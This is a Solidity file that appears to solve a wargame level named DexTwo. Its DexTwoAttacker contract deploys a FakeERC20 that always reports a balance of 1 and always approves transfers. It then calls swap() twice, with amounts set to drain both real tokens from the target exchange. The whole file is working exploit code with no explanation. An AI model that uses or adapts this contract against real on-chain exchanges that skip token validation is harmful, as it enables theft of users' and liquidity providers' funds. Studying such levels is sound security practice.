// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract DexTwoAttacker {
    IDexTwo public instance;

    constructor(address _instance) public {
        instance = IDexTwo(_instance);
    }

    function attack() public {
        FakeERC20 fakeToken = new FakeERC20();

        address token1 = instance.token1();
        address token2 = instance.token2();

        uint256 amount = (100 * IERC20(address(fakeToken)).balanceOf(address(instance))) /
            IERC20(token1).balanceOf(address(instance));
        instance.swap(address(fakeToken), token1, amount);

        amount =
            (100 * IERC20(address(fakeToken)).balanceOf(address(instance))) /
            IERC20(token2).balanceOf(address(instance));
        instance.swap(address(fakeToken), token2, amount);
    }
}

contract FakeERC20 {
    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        return true;
    }
}
